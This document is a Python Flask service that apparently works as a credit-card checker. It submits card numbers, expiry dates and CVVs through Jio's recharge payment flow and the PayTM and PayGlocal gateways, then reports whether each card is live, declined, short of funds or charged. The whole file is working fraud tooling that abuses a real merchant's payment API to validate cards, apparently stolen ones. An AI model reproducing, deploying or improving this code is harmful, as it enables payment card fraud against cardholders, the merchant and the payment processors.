import requests
import re
import time
import uuid
from flask import Flask, request, jsonify

app = Flask(__name__)

UA = "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36"

def get_jio_session():
    s = requests.Session()
    s.headers.update({"User-Agent": UA})
    try:
        s.get("https://www.jio.com/api/jio-authenticate-service/authenticate/authJsonData", timeout=30)
        return s
    except:
        return None

def create_payment_session(s):
    param1 = str(uuid.uuid4()) + "-" + str(uuid.uuid4())
    try:
        r = s.post(
            "https://pay.jio.com/jiopg/v1/payment-options",
            data=f"param1={param1}&param2=JIO&header=false&theme=null&gaparam=null&native=null&useJpgToken=true",
            headers={"Content-Type":"application/x-www-form-urlencoded","Origin":"https://www.jio.com","Referer":"https://www.jio.com/"},
            allow_redirects=False,
            timeout=30
        )
        set_cookie = r.headers.get("Set-Cookie","")
        param = None
        for part in set_cookie.split(","):
            match = re.search(r"param=([a-f0-9\-]+)", part)
            if match:
                param = match.group(1)
                s.cookies.set("param", param, domain="pay.jio.com")
                break
        return param
    except:
        return None

def get_xtoken(s, card_prefix):
    try:
        r = s.post(
            "https://pay.jio.com/jiopg/v1/authorize-card-operation",
            json={"paymentMode":"CCDC","cardPrefix":card_prefix,"isEMISelected":False,"viewOffer":False,"skuCode":None,"copco":None,"isStoreCreditSelected":None},
            headers={"Accept":"application/json","Content-Type":"application/json","Origin":"https://pay.jio.com","Referer":"https://pay.jio.com/JpgWebApp/add-new-card/"},
            timeout=30
        )
        data = r.json()
        if data.get("status"):
            return data.get("token")
        return None
    except:
        return None

def submit_card(s, xtoken, cc, mm, yy, cvv, use_browser=False):
    if len(yy) == 2:
        yy = "20" + yy
    card_type = "visa" if cc[0] == "4" else "mastercard"
    payload = {
        "cvvNumber":cvv,"cashBackApplied":"N","isTrxnStatusCheckEnable":"N",
        "seqId":"","ccRoutePg":"","customerCardTypeValue":card_type,
        "paymentMode":"CCDC","offerAppliedByCust":False,"viewOffer":False,
        "cardType":f"ic_{card_type}","cardNumber":cc,
        "cardTypeText":"VISA_CARD" if cc[0]=="4" else "MASTERCARD_CARD",
        "expiryMonth":mm,"expiryYear":yy,"cardHolderName":"cardholder",
        "userCardSaveConsent":False,
        "browserDetails":{"browserHeader":"application/json","browserJavaEnabled":False,"browserJavascriptEnabled":True,"browserLanguage":"en-US","browserColorDepth":24,"browserScreenHeight":768,"browserScreenWidth":1366,"browserTz":-330,"browserUserAgent":UA} if use_browser else None
    }
    headers = dict(s.headers)
    headers["X-Token"] = xtoken
    headers["Accept"] = "application/json"
    headers["Content-Type"] = "application/json"
    headers["Origin"] = "https://pay.jio.com"
    headers["Referer"] = "https://pay.jio.com/JpgWebApp/add-new-card/"
    try:
        r = s.post("https://pay.jio.com/jpgpciapp/v1/on-ccdc-confirmation", json=payload, headers=headers, timeout=60)
        return r.json()
    except Exception as e:
        return {"status":False,"error":str(e)}

def clean_response(real_resp):
    r = real_resp.lower()
    if "insufficient" in r or "not enough" in r or "does not have enough" in r:
        return "Insufficient balance"
    elif "issuer" in r:
        return "Issuer declined"
    elif "card provider" in r or "provider declined" in r:
        return "Card provider declined"
    elif "bank" in r and "declined" in r:
        return "Bank declined"
    elif "refused" in r:
        return "Transaction refused"
    elif "3ds" in r or "challenge" in r:
        return "3ds challenge"
    elif "blocked" in r:
        return "Card blocked"
    elif "expired" in r:
        return "Card expired"
    elif "cvv" in r:
        return "Wrong cvv"
    elif "invalid" in r:
        return "Invalid card"
    elif "successful" in r or "success" in r:
        return "Payment successful"
    elif "declined" in r:
        return "Card declined"
    elif "session" in r:
        return "Session error"
    else:
        return real_resp[:80]

def process_paytm(s, txn_token, order_id, mid):
    try:
        r = s.post(
            "https://secure.paytmpayments.com/theia/selectCurrencyPage",
            data=f"txnToken={txn_token}&orderId={order_id}&mid={mid}",
            headers={"Content-Type":"application/x-www-form-urlencoded","Origin":"https://pay.jio.com","Referer":"https://pay.jio.com/","Upgrade-Insecure-Requests":"1"},
            allow_redirects=True, timeout=60
        )
        html = r.text.lower()
        if "successful" in html or "recharge successful" in html:
            return {"response":"charged","real-response":"Payment successful","gateway":"PayTM"}
        elif "insufficient" in html or "not enough" in html or "does not have enough" in html:
            return {"response":"insufficient","real-response":"Insufficient balance","gateway":"PayTM"}
        elif "issuer" in html:
            return {"response":"declined","real-response":"Issuer declined","gateway":"PayTM"}
        elif "card provider" in html or "provider declined" in html:
            return {"response":"declined","real-response":"Card provider declined","gateway":"PayTM"}
        elif "bank" in html and "declined" in html:
            return {"response":"declined","real-response":"Bank declined","gateway":"PayTM"}
        elif "declined" in html or "failed" in html:
            return {"response":"declined","real-response":"Card declined","gateway":"PayTM"}
        else:
            return {"response":"error","real-response":"Unknown PayTM response","gateway":"PayTM"}
    except Exception as e:
        return {"response":"error","real-response":str(e),"gateway":"PayTM"}

def process_payglocal(gl_token):
    try:
        s = requests.Session()
        s.headers.update({"User-Agent":UA})
        r = s.get(
            f"https://api.payglocal.com/gl/v1/payments/retry/data?x-gl-token={gl_token}",
            headers={"Accept":"application/json","X-Request-Time":str(int(time.time()*1000)),"Origin":"https://api.payglocal.com","Referer":f"https://api.payglocal.com/gl/payflow-ui/retry?x-gl-token={gl_token}"},
            timeout=30
        )
        data = r.json()
        d = data.get("data",{})
        reason = (d.get("errorMessage") or d.get("message") or d.get("description") or "").lower()
        if "insufficient" in reason or "not enough" in reason or "does not have enough" in reason:
            return {"response":"insufficient","real-response":"Insufficient balance","gateway":"PayGlocal"}
        elif "issuer" in reason:
            return {"response":"declined","real-response":"Issuer declined","gateway":"PayGlocal"}
        elif "provider" in reason:
            return {"response":"declined","real-response":"Card provider declined","gateway":"PayGlocal"}
        elif "declined" in reason or "refused" in reason:
            return {"response":"declined","real-response":"Card declined","gateway":"PayGlocal"}
        elif not reason:
            return {"response":"charged","real-response":"Payment successful","gateway":"PayGlocal"}
        else:
            return {"response":"declined","real-response":reason[:80],"gateway":"PayGlocal"}
    except Exception as e:
        return {"response":"error","real-response":str(e),"gateway":"PayGlocal"}

def check_card(cc, number, amount=19):
    start = time.time()
    parts = cc.split("|")
    if len(parts) != 4:
        return {"response":"error","real-response":"Invalid card format","gateway":"unknown","time":0,"price":f"₹{amount}"}
    card_num, mm, yy, cvv = parts
    s = get_jio_session()
    if not s:
        return {"cc":cc,"response":"error","real-response":"Session init failed","gateway":"unknown","price":f"₹{amount}","time":round(time.time()-start,2)}
    param = create_payment_session(s)
    if not param:
        return {"cc":cc,"response":"error","real-response":"Failed to create payment session","gateway":"unknown","price":f"₹{amount}","time":round(time.time()-start,2)}
    xtoken = get_xtoken(s, card_num[:6])
    if not xtoken:
        return {"cc":cc,"response":"error","real-response":"Failed to get X-Token","gateway":"unknown","price":f"₹{amount}","time":round(time.time()-start,2)}
    use_browser = card_num[0] == "4"
    result = submit_card(s, xtoken, card_num, mm, yy, cvv, use_browser=use_browser)
    html = result.get("htmlForm","")
    if not html:
        msg = result.get("message","Unknown error")
        return {"cc":cc,"response":"error","real-response":clean_response(msg),"gateway":"unknown","price":f"₹{amount}","time":round(time.time()-start,2),"number":number}
    if "paytmpayments.com" in html:
        txn = re.search(r"name='txnToken' value='([^']+)'",html)
        order = re.search(r"name='orderId' value='([^']+)'",html)
        mid = re.search(r"name='mid' value='([^']+)'",html)
        if txn and order and mid:
            final = process_paytm(s,txn.group(1),order.group(1),mid.group(1))
        else:
            final = {"response":"error","real-response":"PayTM params missing","gateway":"PayTM"}
    elif "payglocal" in html or "easebuzz" in html:
        gl = re.search(r"x-gl-token=([A-Za-z0-9_\-\.]+)",html)
        if gl:
            final = process_payglocal(gl.group(1))
        else:
            final = {"response":"error","real-response":"PayGlocal token missing","gateway":"PayGlocal"}
    else:
        final = {"response":"error","real-response":"Unknown gateway","gateway":"unknown"}
    final["cc"] = cc
    final["price"] = f"₹{amount}"
    final["time"] = round(time.time()-start,2)
    final["number"] = number
    return final

@app.route("/check", methods=["GET","POST"])
def check():
    if request.method == "GET":
        cc = request.args.get("cc")
        number = request.args.get("number")
        amount = int(request.args.get("amount",19))
    else:
        data = request.json or {}
        cc = data.get("cc")
        number = data.get("number")
        amount = int(data.get("amount",19))
    if not cc or not number:
        return jsonify({"error":"cc and number required"}),400
    return jsonify(check_card(cc,number,amount))

@app.route("/")
def index():
    return jsonify({"service":"jio-api","version":"1.0"})

if __name__ == "__main__":
    app.run(host="0.0.0.0",port=int(__import__("os").environ.get("PORT",5000)),debug=False)
